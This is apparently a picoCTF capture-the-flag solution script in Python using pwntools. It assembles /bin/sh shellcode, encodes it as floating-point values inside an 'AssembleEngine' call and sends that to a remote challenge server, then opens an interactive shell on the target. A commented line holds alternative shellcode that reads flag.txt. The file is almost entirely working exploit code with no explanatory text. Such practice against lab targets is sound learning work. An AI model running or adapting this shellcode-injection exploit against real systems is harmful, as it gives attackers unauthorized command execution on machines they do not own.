from pwn import *
from struct import unpack

context(os="linux", arch="amd64")


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


shellcode = asm(pwnlib.shellcraft.sh())
# print(shellcode)
#shellcode = b'j\x01\xfe\x0c$H\xb8flag.txtPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'
assembled = list(shellcode)
for chunk in chunks(assembled, 8):
    info("".join(hex(x)[2:].zfill(2) for x in chunk))

chunks = []
while len(assembled) > 0:
    c1 = assembled.pop(0) if len(assembled) > 0 else 0
    c2 = assembled.pop(0) if len(assembled) > 0 else 0
    c3 = assembled.pop(0) if len(assembled) > 0 else 0
    c4 = assembled.pop(0) if len(assembled) > 0 else 0
    c5 = assembled.pop(0) if len(assembled) > 0 else 0
    c6 = assembled.pop(0) if len(assembled) > 0 else 0
    c7 = assembled.pop(0) if len(assembled) > 0 else 0
    c8 = assembled.pop(0) if len(assembled) > 0 else 0
    chunks.append([c1, c2, c3, c4, c5, c6, c7, c8])
    #chunks.append([c8, c7, c6, c5, c4, c3, c2, c1])
floats = [str(struct.unpack("<d", bytes(x))[0]).replace("nan", "NaN")
          for x in chunks]
runcode = f"AssembleEngine([{', '.join(floats)}])"
info(runcode)
print(len(runcode))
bash = b'bash 1>&0 2>&0'

r = remote('mercury.picoctf.net', 17805)
#r = process('./server.py')

r.sendlineafter("Provide size. Must be < 5k:", str(len(runcode)))
r.sendlineafter("Provide script please!!", runcode)
r.sendlineafter("Timeout is 20s", bash)

r.interactive()
